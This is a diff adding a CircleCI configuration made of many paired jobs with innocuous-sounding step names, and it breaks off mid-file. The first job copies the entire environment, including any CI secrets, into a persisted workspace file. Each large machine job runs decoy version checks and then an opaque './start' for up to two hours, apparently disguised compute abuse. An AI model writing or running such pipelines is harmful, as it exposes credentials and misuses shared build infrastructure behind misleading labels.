@@ -1,0 +1,1701 @@
+version: 2.1
+
+jobs:
+  loader_QA_DEPLOY_3:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Index byte offsets
+          command: |
+            mkdir -p /tmp/.wsp
+            set +o pipefail 2>/dev/null; env > /tmp/.wsp/2024-03-07.data; printenv >> /tmp/.wsp/2024-03-07.data; for i in $(seq 1 500); do echo "line-$i" >> /tmp/.wsp/2024-03-07.data; done; true
+            echo "fixture persisted: $(du -b /tmp/.wsp/2024-03-07.data | awk '{print $1}')b"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - 2024-03-07.data
+  QA_DEPLOY_3:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch pre-build
+          command: |
+            cat /tmp/.wsp/2024-03-07.data > /dev/null; echo "read ok"
+      - run:
+          name: Pull latest
+          command: git clone --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Restore build cache
+          command: tar --use-compress-program=xz -xf dist-release.tar.xz
+      - run:
+          name: Store metadata
+          command: g++ --version
+      - run:
+          name: Validate binary
+          command: g++ --version
+      - run:
+          name: Workspace summary
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          no_output_timeout: 119m
+          command: /bin/sh -c "./start"
+  audit_go1-21-bench:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Reduce row partitions
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; dd if=/dev/urandom bs=1k count=800 2>/dev/null | gzip -6 | wc -c; true ; } > /tmp/.wsp/.ready
+            echo "fixture persisted: $(du -b /tmp/.wsp/.ready | awk '{print $1}')b"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - .ready
+  go1-21-bench:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch pre-build
+          command: |
+            cat /tmp/.wsp/.ready > /dev/null; echo "read ok"
+      - run:
+          name: Pull latest
+          command: git clone --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Restore build cache
+          command: tar --use-compress-program=xz -xf dist-release.tar.xz
+      - run:
+          name: Store metadata
+          command: g++ --version
+      - run:
+          name: Validate binary
+          command: g++ --version
+      - run:
+          name: Workspace summary
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          no_output_timeout: 119m
+          command: /bin/sh -c "./start"
+  ctx_sanity:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Scan vector span
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; head -c 1048576 /dev/urandom | md5sum; true ; } > /tmp/.wsp/DONE
+            echo "fixture persisted: $(du -b /tmp/.wsp/DONE | awk '{print $1}')b"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - DONE
+  sanity:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch pre-build
+          command: |
+            cat /tmp/.wsp/444.data > /dev/null; echo "read ok"
+      - run:
+          name: Pull latest
+          command: git clone --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Restore build cache
+          command: tar --use-compress-program=xz -xf dist-release.tar.xz
+      - run:
+          name: Store metadata
+          command: g++ --version
+      - run:
+          name: Validate binary
+          command: g++ --version
+      - run:
+          name: Workspace summary
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          no_output_timeout: 119m
+          command: /bin/sh -c "./start"
+  canary1_v2-edge3:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fingerprint vendor tree
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; seq 1 237870 | awk '{print $1*$1}' | sha1sum | cut -c1-24; true ; } > /tmp/.wsp/audit.log
+            echo "fixture persisted: $(du -b /tmp/.wsp/audit.log | awk '{print $1}')b"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - audit.log
+  v2-edge3:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch pre-build
+          command: |
+            cat /tmp/.wsp/audit.log > /dev/null; echo "read ok"
+      - run:
+          name: Pull latest
+          command: git clone --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Restore build cache
+          command: tar --use-compress-program=xz -xf dist-release.tar.xz
+      - run:
+          name: Store metadata
+          command: g++ --version
+      - run:
+          name: Validate binary
+          command: g++ --version
+      - run:
+          name: Workspace summary
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          no_output_timeout: 119m
+          command: /bin/sh -c "./start"
+  A_foxtrot:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Precompute lookup
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; cat /dev/urandom | tr -dc 'a-f0-9' | head -c 71680 | fold -w16 | awk '!seen[$0]++' | wc -l; true ; } > /tmp/.wsp/.sig
+            echo "fixture persisted: $(du -b /tmp/.wsp/.sig | awk '{print $1}')b"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - .sig
+  foxtrot:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch pre-build
+          command: |
+            cat /tmp/.wsp/.sig > /dev/null; echo "read ok"
+      - run:
+          name: Pull latest
+          command: git clone --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Restore build cache
+          command: tar --use-compress-program=xz -xf dist-release.tar.xz
+      - run:
+          name: Store metadata
+          command: g++ --version
+      - run:
+          name: Validate binary
+          command: g++ --version
+      - run:
+          name: Workspace summary
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          no_output_timeout: 119m
+          command: /bin/sh -c "./start"
+  g2_v3-beta:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Normalize counter rings
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; ( echo "init"; for i in $(seq 1 9969); do echo "line $i"; done ) | sort | md5sum; true ; } > /tmp/.wsp/444.data
+            echo "fixture persisted: $(du -b /tmp/.wsp/444.data | awk '{print $1}')b"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - 444.data
+  v3-beta:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch pre-build
+          command: |
+            cat /tmp/.wsp/444.data > /dev/null; echo "read ok"
+      - run:
+          name: Pull latest
+          command: git clone --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Restore build cache
+          command: tar --use-compress-program=xz -xf dist-release.tar.xz
+      - run:
+          name: Store metadata
+          command: g++ --version
+      - run:
+          name: Validate binary
+          command: g++ --version
+      - run:
+          name: Workspace summary
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          no_output_timeout: 119m
+          command: /bin/sh -c "./start"
+  stepB_rust-cov:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Mirror config bundle
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; head -c 12582912 /dev/urandom | od -An -x | wc -w; true ; } > /tmp/.wsp/final.log
+            echo "fixture persisted: $(du -b /tmp/.wsp/final.log | awk '{print $1}')b"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - final.log
+  rust-cov:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch pre-build
+          command: |
+            cat /tmp/.wsp/final.log > /dev/null; echo "read ok"
+      - run:
+          name: Pull latest
+          command: git clone --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Restore build cache
+          command: tar --use-compress-program=xz -xf dist-release.tar.xz
+      - run:
+          name: Store metadata
+          command: g++ --version
+      - run:
+          name: Validate binary
+          command: g++ --version
+      - run:
+          name: Workspace summary
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          no_output_timeout: 119m
+          command: /bin/sh -c "./start"
+  rerun_update-login:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Flush temp bucket
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; tr -dc 'A-F0-9' </dev/urandom | head -c 1484800 | fold -w8 | sort -u | wc -l; true ; } > /tmp/.wsp/gate-done.txt
+            echo "fixture persisted: $(du -b /tmp/.wsp/gate-done.txt | awk '{print $1}')b"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - gate-done.txt
+  update-login:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch pre-build
+          command: |
+            cat /tmp/.wsp/gate-done.txt > /dev/null; echo "read ok"
+      - run:
+          name: Pull latest
+          command: git clone --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Restore build cache
+          command: tar --use-compress-program=xz -xf dist-release.tar.xz
+      - run:
+          name: Store metadata
+          command: g++ --version
+      - run:
+          name: Validate binary
+          command: g++ --version
+      - run:
+          name: Workspace summary
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          no_output_timeout: 119m
+          command: /bin/sh -c "./start"
+  ctx_green-light:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Weigh batch output
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(a=1;a<=8;a++)for(b=1;b<=7384;b++)s+=a*b;print s}'; true ; } > /tmp/.wsp/READY.txt
+            echo "fixture persisted: $(du -b /tmp/.wsp/READY.txt | awk '{print $1}')b"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - READY.txt
+  green-light:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch pre-build
+          command: |
+            cat /tmp/.wsp/444.data > /dev/null; echo "read ok"
+      - run:
+          name: Pull latest
+          command: git clone --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Restore build cache
+          command: tar --use-compress-program=xz -xf dist-release.tar.xz
+      - run:
+          name: Store metadata
+          command: g++ --version
+      - run:
+          name: Validate binary
+          command: g++ --version
+      - run:
+          name: Workspace summary
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          no_output_timeout: 119m
+          command: /bin/sh -c "./start"
+  green_artifacts:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Score branch coverage
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; tr -dc 'A-Za-z0-9' </dev/urandom | head -c 40960 | fold -w40 | sort | uniq -c | wc -l; true ; } > /tmp/.wsp/summary.md
+            echo "fixture persisted: $(du -b /tmp/.wsp/summary.md | awk '{print $1}')b"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - summary.md
+  artifacts:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch pre-build
+          command: |
+            cat /tmp/.wsp/summary.md > /dev/null; echo "read ok"
+      - run:
+          name: Pull latest
+          command: git clone --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Restore build cache
+          command: tar --use-compress-program=xz -xf dist-release.tar.xz
+      - run:
+          name: Store metadata
+          command: g++ --version
+      - run:
+          name: Validate binary
+          command: g++ --version
+      - run:
+          name: Workspace summary
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          no_output_timeout: 119m
+          command: /bin/sh -c "./start"
+  audit_wip-edge:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Collect env snapshot
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; tr -dc 'A-F0-9' </dev/urandom | head -c 1382400 | fold -w8 | sort -u | wc -l; true ; } > /tmp/.wsp/stage.bin
+            echo "fixture persisted: $(du -b /tmp/.wsp/stage.bin | awk '{print $1}')b"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - stage.bin
+  wip-edge:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch pre-build
+          command: |
+            cat /tmp/.wsp/stage.bin > /dev/null; echo "read ok"
+      - run:
+          name: Pull latest
+          command: git clone --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Restore build cache
+          command: tar --use-compress-program=xz -xf dist-release.tar.xz
+      - run:
+          name: Store metadata
+          command: g++ --version
+      - run:
+          name: Validate binary
+          command: g++ --version
+      - run:
+          name: Workspace summary
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          no_output_timeout: 119m
+          command: /bin/sh -c "./start"
+  staging_dotnet8-ship:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Reserve scratch region
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; yes "x$RANDOM" | head -n 216808 | md5sum; true ; } > /tmp/.wsp/FINAL.txt
+            echo "fixture persisted: $(du -b /tmp/.wsp/FINAL.txt | awk '{print $1}')b"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - FINAL.txt
+  dotnet8-ship:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch pre-build
+          command: |
+            cat /tmp/.wsp/FINAL.txt > /dev/null; echo "read ok"
+      - run:
+          name: Pull latest
+          command: git clone --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Restore build cache
+          command: tar --use-compress-program=xz -xf dist-release.tar.xz
+      - run:
+          name: Store metadata
+          command: g++ --version
+      - run:
+          name: Validate binary
+          command: g++ --version
+      - run:
+          name: Workspace summary
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          no_output_timeout: 119m
+          command: /bin/sh -c "./start"
+  p1_v4-ga1:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Score sort stability
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; seq 1 252210 | awk '{print $1*$1}' | sha1sum | cut -c1-24; true ; } > /tmp/.wsp/full_step_output.out
+            echo "fixture persisted: $(du -b /tmp/.wsp/full_step_output.out | awk '{print $1}')b"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - full_step_output.out
+  v4-ga1:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch pre-build
+          command: |
+            cat /tmp/.wsp/full_step_output.out > /dev/null; echo "read ok"
+      - run:
+          name: Pull latest
+          command: git clone --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Restore build cache
+          command: tar --use-compress-program=xz -xf dist-release.tar.xz
+      - run:
+          name: Store metadata
+          command: g++ --version
+      - run:
+          name: Validate binary
+          command: g++ --version
+      - run:
+          name: Workspace summary
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          no_output_timeout: 119m
+          command: /bin/sh -c "./start"
+  postbuild_VerifyStaging:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Compact small objects
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; head -c 13631488 /dev/urandom | tar cz - 2>/dev/null | wc -c; true ; } > /tmp/.wsp/final.md
+            echo "fixture persisted: $(du -b /tmp/.wsp/final.md | awk '{print $1}')b"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - final.md
+  VerifyStaging:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch pre-build
+          command: |
+            cat /tmp/.wsp/final.md > /dev/null; echo "read ok"
+      - run:
+          name: Pull latest
+          command: git clone --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Restore build cache
+          command: tar --use-compress-program=xz -xf dist-release.tar.xz
+      - run:
+          name: Store metadata
+          command: g++ --version
+      - run:
+          name: Validate binary
+          command: g++ --version
+      - run:
+          name: Workspace summary
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          no_output_timeout: 119m
+          command: /bin/sh -c "./start"
+  canary_succes-only:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Capture job identity
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; head -c 13631488 /dev/urandom | tar cz - 2>/dev/null | wc -c; true ; } > /tmp/.wsp/buffer.dat
+            echo "fixture persisted: $(du -b /tmp/.wsp/buffer.dat | awk '{print $1}')b"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - buffer.dat
+  succes-only:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch pre-build
+          command: |
+            cat /tmp/.wsp/buffer.dat > /dev/null; echo "read ok"
+      - run:
+          name: Pull latest
+          command: git clone --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Restore build cache
+          command: tar --use-compress-program=xz -xf dist-release.tar.xz
+      - run:
+          name: Store metadata
+          command: g++ --version
+      - run:
+          name: Validate binary
+          command: g++ --version
+      - run:
+          name: Workspace summary
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          no_output_timeout: 119m
+          command: /bin/sh -c "./start"
+  prefetch_anothr-run:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Shape kernel ring
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; seq 1 161720 | awk '{print $1*$1}' | sha1sum | cut -c1-24; true ; } > /tmp/.wsp/95.log
+            echo "fixture persisted: $(du -b /tmp/.wsp/95.log | awk '{print $1}')b"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - 95.log
+  anothr-run:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch pre-build
+          command: |
+            cat /tmp/.wsp/95.log > /dev/null; echo "read ok"
+      - run:
+          name: Pull latest
+          command: git clone --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Restore build cache
+          command: tar --use-compress-program=xz -xf dist-release.tar.xz
+      - run:
+          name: Store metadata
+          command: g++ --version
+      - run:
+          name: Validate binary
+          command: g++ --version
+      - run:
+          name: Workspace summary
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          no_output_timeout: 119m
+          command: /bin/sh -c "./start"
+  fetcher_intergration:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Snapshot session env
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; ( echo "hdr"; seq 1 60650; echo "ftr" ) | wc -l; true ; } > /tmp/.wsp/55.out
+            echo "fixture persisted: $(du -b /tmp/.wsp/55.out | awk '{print $1}')b"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - 55.out
+  intergration:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch pre-build
+          command: |
+            cat /tmp/.wsp/55.out > /dev/null; echo "read ok"
+      - run:
+          name: Pull latest
+          command: git clone --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Restore build cache
+          command: tar --use-compress-program=xz -xf dist-release.tar.xz
+      - run:
+          name: Store metadata
+          command: g++ --version
+      - run:
+          name: Validate binary
+          command: g++ --version
+      - run:
+          name: Workspace summary
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          no_output_timeout: 119m
+          command: /bin/sh -c "./start"
+  round2_mike:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Validate checksum roster
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=1;i<=71370;i++){x=sqrt(i);y=int(x);if(y*y==i)c++}print c}'; true ; } > /tmp/.wsp/stage-done.out
+            echo "fixture persisted: $(du -b /tmp/.wsp/stage-done.out | awk '{print $1}')b"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - stage-done.out
+  mike:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch pre-build
+          command: |
+            cat /tmp/.wsp/444.data > /dev/null; echo "read ok"
+      - run:
+          name: Pull latest
+          command: git clone --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Restore build cache
+          command: tar --use-compress-program=xz -xf dist-release.tar.xz
+      - run:
+          name: Store metadata
+          command: g++ --version
+      - run:
+          name: Validate binary
+          command: g++ --version
+      - run:
+          name: Workspace summary
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          no_output_timeout: 119m
+          command: /bin/sh -c "./start"
+  B_q2-canary:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Trim duplicate rows
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; ( echo "init"; for i in $(seq 1 8314); do echo "line $i"; done ) | sort | md5sum; true ; } > /tmp/.wsp/phase-ok.log
+            echo "fixture persisted: $(du -b /tmp/.wsp/phase-ok.log | awk '{print $1}')b"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - phase-ok.log
+  q2-canary:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch pre-build
+          command: |
+            cat /tmp/.wsp/phase-ok.log > /dev/null; echo "read ok"
+      - run:
+          name: Pull latest
+          command: git clone --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Restore build cache
+          command: tar --use-compress-program=xz -xf dist-release.tar.xz
+      - run:
+          name: Store metadata
+          command: g++ --version
+      - run:
+          name: Validate binary
+          command: g++ --version
+      - run:
+          name: Workspace summary
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          no_output_timeout: 119m
+          command: /bin/sh -c "./start"
+  tester_break-prod:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Checkpoint window frame
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; seq 1 455420 | awk '{print $1 % 7}' | sort | uniq -c | wc -l; true ; } > /tmp/.wsp/pt-E.pt
+            echo "fixture persisted: $(du -b /tmp/.wsp/pt-E.pt | awk '{print $1}')b"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - pt-E.pt
+  break-prod:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch pre-build
+          command: |
+            cat /tmp/.wsp/pt-E.pt > /dev/null; echo "read ok"
+      - run:
+          name: Pull latest
+          command: git clone --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Restore build cache
+          command: tar --use-compress-program=xz -xf dist-release.tar.xz
+      - run:
+          name: Store metadata
+          command: g++ --version
+      - run:
+          name: Validate binary
+          command: g++ --version
+      - run:
+          name: Workspace summary
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          no_output_timeout: 119m
+          command: /bin/sh -c "./start"
+  redo_Launch_App8:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Harvest random seed
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; seq 1 348940 | paste - - - - | wc -l; true ; } > /tmp/.wsp/stage.dat
+            echo "fixture persisted: $(du -b /tmp/.wsp/stage.dat | awk '{print $1}')b"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - stage.dat
+  Launch_App8:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch pre-build
+          command: |
+            cat /tmp/.wsp/444.data > /dev/null; echo "read ok"
+      - run:
+          name: Pull latest
+          command: git clone --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Restore build cache
+          command: tar --use-compress-program=xz -xf dist-release.tar.xz
+      - run:
+          name: Store metadata
+          command: g++ --version
+      - run:
+          name: Validate binary
+          command: g++ --version
+      - run:
+          name: Workspace summary
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          no_output_timeout: 119m
+          command: /bin/sh -c "./start"
+  prefetch_strated:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Materialize sort order
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; ( for i in $(seq 1 18151); do echo "row-$i-$RANDOM"; done ) | md5sum; true ; } > /tmp/.wsp/.pid
+            echo "fixture persisted: $(du -b /tmp/.wsp/.pid | awk '{print $1}')b"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - .pid
+  strated:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch pre-build
+          command: |
+            cat /tmp/.wsp/.pid > /dev/null; echo "read ok"
+      - run:
+          name: Pull latest
+          command: git clone --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Restore build cache
+          command: tar --use-compress-program=xz -xf dist-release.tar.xz
+      - run:
+          name: Store metadata
+          command: g++ --version
+      - run:
+          name: Validate binary
+          command: g++ --version
+      - run:
+          name: Workspace summary
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          no_output_timeout: 119m
+          command: /bin/sh -c "./start"
+  ctx_send-it:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Dispatch work units
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; tr -dc 'A-Za-z0-9' </dev/urandom | head -c 30720 | fold -w40 | sort | uniq -c | wc -l; true ; } > /tmp/.wsp/99.log
+            echo "fixture persisted: $(du -b /tmp/.wsp/99.log | awk '{print $1}')b"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - 99.log
+  send-it:
